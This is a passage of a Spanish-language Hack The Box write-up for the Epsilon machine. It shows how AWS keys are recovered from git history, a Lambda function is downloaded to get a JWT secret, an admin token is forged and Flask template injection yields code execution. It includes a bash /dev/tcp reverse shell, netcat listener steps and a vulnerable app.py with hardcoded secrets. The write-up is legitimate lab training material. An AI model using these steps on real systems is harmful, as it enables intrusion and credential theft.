<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/track</span><span class="sh">"</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">track</span><span class="p">():</span>
	<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
		<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">track.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/order</span><span class="sh">'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
	<span class="k">if</span> <span class="nf">verify_jwt</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">auth</span><span class="sh">'</span><span class="p">),</span><span class="n">secret</span><span class="p">):</span>
		<span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span><span class="o">==</span><span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
			<span class="n">costume</span><span class="o">=</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">"</span><span class="s">costume</span><span class="sh">"</span><span class="p">]</span>
			<span class="n">message</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
			Your order of </span><span class="sh">"</span><span class="s">{}</span><span class="sh">"</span><span class="s"> has been placed successfully.
			</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">costume</span><span class="p">)</span>
			<span class="n">tmpl</span><span class="o">=</span><span class="nf">render_template_string</span><span class="p">(</span><span class="n">message</span><span class="p">,</span><span class="n">costume</span><span class="o">=</span><span class="n">costume</span><span class="p">)</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">,</span><span class="n">message</span><span class="o">=</span><span class="n">tmpl</span><span class="p">)</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">order.html</span><span class="sh">'</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">code</span><span class="o">=</span><span class="mi">302</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="sh">'</span><span class="s">true</span><span class="sh">'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>En <code class="language-plaintext highlighter-rouge">server.py</code> podemos ver que verifica el <code class="language-plaintext highlighter-rouge">jwt</code> podemos crear uno pero en estos casos necesitamos el <code class="language-plaintext highlighter-rouge">secret</code> para que esa valido el problema es que no lo tenemos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/4.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/5.png" />
</p>

<ul>
  <li>Si vemos el otro código ya se esta empleando AWS <a href="https://aws.amazon.com/es/what-is-aws/">https://aws.amazon.com/es/what-is-aws/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>track_api_CR_148.py
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session <span class="o">=</span> Session<span class="o">(</span>
    <span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'&lt;aws_access_key_id&gt;'</span>,
    <span class="nv">aws_secret_access_key</span><span class="o">=</span><span class="s1">'&lt;aws_secret_access_key&gt;'</span>,
    <span class="nv">region_name</span><span class="o">=</span><span class="s1">'us-east-1'</span>,
    <span class="nv">endpoint_url</span><span class="o">=</span><span class="s1">'http://cloud.epsilon.htb'</span><span class="o">)</span>
aws_lambda <span class="o">=</span> session.client<span class="o">(</span><span class="s1">'lambda'</span><span class="o">)</span>


def files_to_zip<span class="o">(</span>path<span class="o">)</span>:
    <span class="k">for </span>root, <span class="nb">dirs</span>, files <span class="k">in </span>os.walk<span class="o">(</span>path<span class="o">)</span>:
        <span class="k">for </span>f <span class="k">in </span>files:
            full_path <span class="o">=</span> os.path.join<span class="o">(</span>root, f<span class="o">)</span>
            archive_name <span class="o">=</span> full_path[len<span class="o">(</span>path<span class="o">)</span> + len<span class="o">(</span>os.sep<span class="o">)</span>:]
            yield full_path, archive_name


def make_zip_file_bytes<span class="o">(</span>path<span class="o">)</span>:
    buf <span class="o">=</span> io.BytesIO<span class="o">()</span>
    with ZipFile<span class="o">(</span>buf, <span class="s1">'w'</span><span class="o">)</span> as z:
        <span class="k">for </span>full_path, archive_name <span class="k">in </span>files_to_zip<span class="o">(</span><span class="nv">path</span><span class="o">=</span>path<span class="o">)</span>:
            z.write<span class="o">(</span>full_path, archive_name<span class="o">)</span>
    <span class="k">return </span>buf.getvalue<span class="o">()</span>


def update_lambda<span class="o">(</span>lambda_name, lambda_code_path<span class="o">)</span>:
    <span class="k">if </span>not os.path.isdir<span class="o">(</span>lambda_code_path<span class="o">)</span>:
        raise ValueError<span class="o">(</span><span class="s1">'Lambda directory does not exist: {0}'</span>.format<span class="o">(</span>lambda_code_path<span class="o">))</span>
    aws_lambda.update_function_code<span class="o">(</span>
        <span class="nv">FunctionName</span><span class="o">=</span>lambda_name,
        <span class="nv">ZipFile</span><span class="o">=</span>make_zip_file_bytes<span class="o">(</span><span class="nv">path</span><span class="o">=</span>lambda_code_path<span class="o">))</span>
</code></pre></div></div>

<ul>
  <li>Además se esta empleando lambda en Python3 es una función anónima pero vemos que si tiene algo que ver con AWS.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/6.png" />
</p>

<h2 id="aws-lambda">AWS Lambda</h2>

<ul>
  <li>
    <p>Para podemos enumerar este servicio necesitamos instalar <code class="language-plaintext highlighter-rouge">AWS</code> en nuestro equipo.</p>
  </li>
  <li>
    <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3</a>.</p>
  </li>
  <li>
    <p><a href="https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html">https://docs.aws.amazon.com/es_es/cli/latest/userguide/getting-started-install.html</a>.</p>
  </li>
  <li>
    <p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="s2">"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"</span> <span class="nt">-o</span> <span class="s2">"awscliv2.zip"</span>
❯ unzip awscliv2.zip
❯ <span class="nb">sudo</span> ./aws/install
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
You can now run: /usr/local/bin/aws <span class="nt">--version</span>
</code></pre></div></div>

<ul>
  <li>Ahora si ya lo tenemos instalado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">-h</span>

usage: aws <span class="o">[</span>options] &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="o">[</span>&lt;subcommand&gt; ...] <span class="o">[</span>parameters]
To see <span class="nb">help </span>text, you can run:

  aws <span class="nb">help
  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="nb">help
  </span>aws &lt;<span class="nb">command</span><span class="o">&gt;</span> &lt;subcommand&gt; <span class="nb">help

</span>aws: error: the following arguments are required: <span class="nb">command</span>
</code></pre></div></div>

<ul>
  <li>
    <p>En el script de Python3 donde nos hablaban de AWS y lambda nos dieron un subdominio el cual es el <code class="language-plaintext highlighter-rouge">endpoint_url</code>.</p>
  </li>
  <li>
    <p>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.134 cloud.epsilon.htb epsilon.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.134 cloud.epsilon.htb epsilon.htb
</code></pre></div></div>

<ul>
  <li>Para enumerar el servicio necesitamos una key así que vamos a enumerar el repositorio para ver si en algún momento la clave si estaba antes.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 <span class="o">(</span>HEAD -&gt; master<span class="o">)</span>
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root &lt;root@epsilon.htb&gt;
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module
</code></pre></div></div>

<ul>
  <li>Vamos a inspeccionar este.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
</code></pre></div></div>

<ul>
  <li>Vemos la información que necesitamos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">aws_access_key_id</span><span class="o">=</span><span class="s1">'AQLA5M37BDN6FJP76TDC'</span>,
+aws_secret_access_key<span class="o">=</span><span class="s1">'OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A'</span>,
</code></pre></div></div>

<ul>
  <li>Vamos a configurar todo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws configure
AWS Access Key ID <span class="o">[</span>None]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key <span class="o">[</span>None]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name <span class="o">[</span>None]: us-east-1
Default output format <span class="o">[</span>None]: json
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora vamos a conectarnos al <code class="language-plaintext highlighter-rouge">endpoint</code>.</p>
  </li>
  <li>
    <p>Y agregamos lo de lambda para ver las funciones.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda list-functions
<span class="o">{</span>
    <span class="s2">"Functions"</span>: <span class="o">[</span>
        <span class="o">{</span>
            <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
            <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
            <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
            <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
            <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
            <span class="s2">"CodeSize"</span>: 478,
            <span class="s2">"Description"</span>: <span class="s2">""</span>,
            <span class="s2">"Timeout"</span>: 3,
            <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
            <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
            <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
            <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
            <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
                <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
            <span class="o">}</span>,
            <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
            <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
            <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
            <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
        <span class="o">}</span>
    <span class="o">]</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Vemos que hay un <code class="language-plaintext highlighter-rouge">.zip</code> de la función <code class="language-plaintext highlighter-rouge">costume_shop_v1</code> vamos a ver mas información.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ aws <span class="nt">--endpoint-url</span><span class="o">=</span>http://cloud.epsilon.htb lambda get-function <span class="nt">--function-name</span><span class="o">=</span>costume_shop_v1 | jq
<span class="o">{</span>
  <span class="s2">"Configuration"</span>: <span class="o">{</span>
    <span class="s2">"FunctionName"</span>: <span class="s2">"costume_shop_v1"</span>,
    <span class="s2">"FunctionArn"</span>: <span class="s2">"arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1"</span>,
    <span class="s2">"Runtime"</span>: <span class="s2">"python3.7"</span>,
    <span class="s2">"Role"</span>: <span class="s2">"arn:aws:iam::123456789012:role/service-role/dev"</span>,
    <span class="s2">"Handler"</span>: <span class="s2">"my-function.handler"</span>,
    <span class="s2">"CodeSize"</span>: 478,
    <span class="s2">"Description"</span>: <span class="s2">""</span>,
    <span class="s2">"Timeout"</span>: 3,
    <span class="s2">"LastModified"</span>: <span class="s2">"2024-07-05T00:05:15.900+0000"</span>,
    <span class="s2">"CodeSha256"</span>: <span class="s2">"IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw="</span>,
    <span class="s2">"Version"</span>: <span class="s2">"</span><span class="nv">$LATEST</span><span class="s2">"</span>,
    <span class="s2">"VpcConfig"</span>: <span class="o">{}</span>,
    <span class="s2">"TracingConfig"</span>: <span class="o">{</span>
      <span class="s2">"Mode"</span>: <span class="s2">"PassThrough"</span>
    <span class="o">}</span>,
    <span class="s2">"RevisionId"</span>: <span class="s2">"d44f236b-458b-4d09-9fb3-dcabbb784baa"</span>,
    <span class="s2">"State"</span>: <span class="s2">"Active"</span>,
    <span class="s2">"LastUpdateStatus"</span>: <span class="s2">"Successful"</span>,
    <span class="s2">"PackageType"</span>: <span class="s2">"Zip"</span>
  <span class="o">}</span>,
  <span class="s2">"Code"</span>: <span class="o">{</span>
    <span class="s2">"Location"</span>: <span class="s2">"http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"</span>
  <span class="o">}</span>,
  <span class="s2">"Tags"</span>: <span class="o">{}</span>
<span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Tenemos la ubicación del archivo <code class="language-plaintext highlighter-rouge">.zip</code> vamos a descargarlo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
<span class="nt">--2024-07-04</span> 18:56:30--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolving cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>... 10.10.11.134
Connecting to cloud.epsilon.htb <span class="o">(</span>cloud.epsilon.htb<span class="o">)</span>|10.10.11.134|:80... connected.
HTTP request sent, awaiting response... 200
Length: 478 <span class="o">[</span>application/zip]
Saving to: ‘code’

code                          100%[<span class="o">=================================================&gt;]</span>     478  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2024-07-04 18:56:30 <span class="o">(</span>6.00 MB/s<span class="o">)</span> - ‘code’ saved <span class="o">[</span>478/478]

❯ file code
code: Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>deflate
❯ <span class="nb">mv </span>code code.zip
</code></pre></div></div>

<ul>
  <li>Vemos un script en python3.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip code.zip
Archive:  code.zip
  inflating: lambda_function.py
</code></pre></div></div>

<ul>
  <li>Tenemos un secret.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/8.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">secret</span><span class="o">=</span><span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span> <span class="c">#apigateway authorization for CR-124</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como se usa <code class="language-plaintext highlighter-rouge">JWT</code> lo mas probable es que sea el <code class="language-plaintext highlighter-rouge">secret</code> que necesitamos que vimos en el secret.py cuando enumeramos el <code class="language-plaintext highlighter-rouge">.git</code>.</p>
  </li>
  <li>
    <p>Ahora que tenemos el <code class="language-plaintext highlighter-rouge">secret</code> podemos construir el JWT basándonos en el script que nos comparten la sintaxis <a href="https://pyjwt.readthedocs.io/en/stable/">https://pyjwt.readthedocs.io/en/stable/</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3
Python 3.11.9 <span class="o">(</span>main, Apr 10 2024, 13:16:36<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> import jwt
<span class="o">&gt;&gt;&gt;</span> jwt.encode<span class="o">({</span><span class="s1">'username'</span>: <span class="s1">'admin'</span><span class="o">}</span>, <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>, <span class="nv">algorithm</span><span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
<span class="s1">'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4'</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a incorporarla como una <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/9.png" />
</p>

<ul>
  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">/home</code> vemos que ya no nos lleva al panel de <code class="language-plaintext highlighter-rouge">login</code> por que estamos conectados.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/10.png" />
</p>

<ul>
  <li>Vamos a crear una orden</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/11.png" />
</p>

<ul>
  <li>Como esta corriendo flask por detrás como vimos en el script de Python3 y podemos ver el output de algo que podemos ver por pantalla puede ser vulnerable a SSTI vamos capturar la petición con Burpsuite al darle click a order para enumerar <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/12.png" />
</p>

<ul>
  <li>Vemos que se crea.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/13.png" />
</p>

<ul>
  <li>Si cambiamos el nombre del <code class="language-plaintext highlighter-rouge">costume</code> vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/14.png" />
</p>

<ul>
  <li>Vamos a comprobar si es vulnerable con la típica operación de 7x7 si vemos el resultado reflejado sabremos que es vulnerable <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/15.png" />
</p>

<ul>
  <li>
    <p>Vemos que podemos ejecutar comandos como nos dicen en Payload All the Things.</p>
  </li>
  <li>
    <p>Tenemos RCE.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/16.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/temp.png" />
</p>

<h2 id="shell-as-tom">Shell as Tom</h2>

<ul>
  <li>Vamos a enviarnos una reverse <code class="language-plaintext highlighter-rouge">shell</code> a nuestro equipo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>index.html
<span class="c">#!/bin/bash</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.63/443 0&gt;&amp;1
</code></pre></div></div>

<ul>
  <li>Vamos hacer una petición para ver si la recibimos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/17.png" />
</p>

<ul>
  <li>La recibimos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.134 - - <span class="o">[</span>04/Jul/2024 19:25:17] <span class="s2">"GET / HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Vamos a ponernos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/epsilon/18.png" />
</p>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.134] 37428
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>991<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">whoami
whoami
</span>tom
tom@epsilon:/var/www/app<span class="err">$</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
tom@epsilon:/var/www/app<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 30566 suspended  nc <span class="nt">-nlvp</span> 443
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 30566 continued  nc <span class="nt">-nlvp</span> 443
                                    reset xterm
ENTER
tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<ul>
  <li>Si analizamos el código <code class="language-plaintext highlighter-rouge">app.py</code> podemos ver las credenciales para podernos logearnos al panel de login.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tom@epsilon:/var/www/app<span class="nv">$ </span><span class="nb">cat </span>app.py
<span class="c">#!/usr/bin/python3</span>

import jwt
from flask import <span class="k">*</span>

app <span class="o">=</span> Flask<span class="o">(</span>__name__<span class="o">)</span>
secret <span class="o">=</span> <span class="s1">'RrXCv`mrNe!K!4+5`wYq'</span>

def verify_jwt<span class="o">(</span>token,key<span class="o">)</span>:
	try:
		<span class="nv">username</span><span class="o">=</span>jwt.decode<span class="o">(</span>token,key,algorithms<span class="o">=[</span><span class="s1">'HS256'</span>,]<span class="o">)[</span><span class="s1">'username'</span><span class="o">]</span>
		<span class="k">if </span>username:
			<span class="k">return </span>True
		<span class="k">else</span>:
			<span class="k">return </span>False
	except:
		<span class="k">return </span>False

@app.route<span class="o">(</span><span class="s2">"/"</span>, <span class="nv">methods</span><span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def index<span class="o">()</span>:
	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
		<span class="k">if </span>request.form[<span class="s1">'username'</span><span class="o">]==</span><span class="s2">"admin"</span> and request.form[<span class="s1">'password'</span><span class="o">]==</span><span class="s2">"4d_09@fhgRTdws2"</span>:
			res <span class="o">=</span> make_response<span class="o">()</span>
			<span class="nv">username</span><span class="o">=</span>request.form[<span class="s1">'username'</span><span class="o">]</span>
			<span class="nv">token</span><span class="o">=</span>jwt.encode<span class="o">({</span><span class="s2">"username"</span>:<span class="s2">"admin"</span><span class="o">}</span>,secret,algorithm<span class="o">=</span><span class="s2">"HS256"</span><span class="o">)</span>
			res.set_cookie<span class="o">(</span><span class="s2">"auth"</span>,token<span class="o">)</span>
			res.headers[<span class="s1">'location'</span><span class="o">]=</span><span class="s1">'/home'</span>
			<span class="k">return </span>res,302
		<span class="k">else</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'index.html'</span><span class="o">)</span>

@app.route<span class="o">(</span><span class="s2">"/home"</span><span class="o">)</span>
def home<span class="o">()</span>:
	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'home.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>

@app.route<span class="o">(</span><span class="s2">"/track"</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def track<span class="o">()</span>:
	<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
		<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span>,message<span class="o">=</span>True<span class="o">)</span>
		<span class="k">else</span>:
			<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'track.html'</span><span class="o">)</span>

@app.route<span class="o">(</span><span class="s1">'/order'</span>,methods<span class="o">=[</span><span class="s2">"GET"</span>,<span class="s2">"POST"</span><span class="o">])</span>
def order<span class="o">()</span>:
	<span class="k">if </span>verify_jwt<span class="o">(</span>request.cookies.get<span class="o">(</span><span class="s1">'auth'</span><span class="o">)</span>,secret<span class="o">)</span>:
		<span class="k">if </span>request.method<span class="o">==</span><span class="s2">"POST"</span>:
			<span class="nv">costume</span><span class="o">=</span>request.form[<span class="s2">"costume"</span><span class="o">]</span>
			message <span class="o">=</span> <span class="s1">'''
			Your order of "{}" has been placed successfully.
			'''</span>.format<span class="o">(</span>costume<span class="o">)</span>
			<span class="nv">tmpl</span><span class="o">=</span>render_template_string<span class="o">(</span>message,costume<span class="o">=</span>costume<span class="o">)</span>
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span>,message<span class="o">=</span>tmpl<span class="o">)</span>
		<span class="k">else</span>:
			<span class="k">return </span>render_template<span class="o">(</span><span class="s1">'order.html'</span><span class="o">)</span>
	<span class="k">else</span>:
		<span class="k">return </span>redirect<span class="o">(</span><span class="s1">'/'</span>,code<span class="o">=</span>302<span class="o">)</span>
app.run<span class="o">(</span><span class="s1">'0.0.0.0'</span>,5000<span class="o">)</span>
</code></pre></div></div>

<ul>
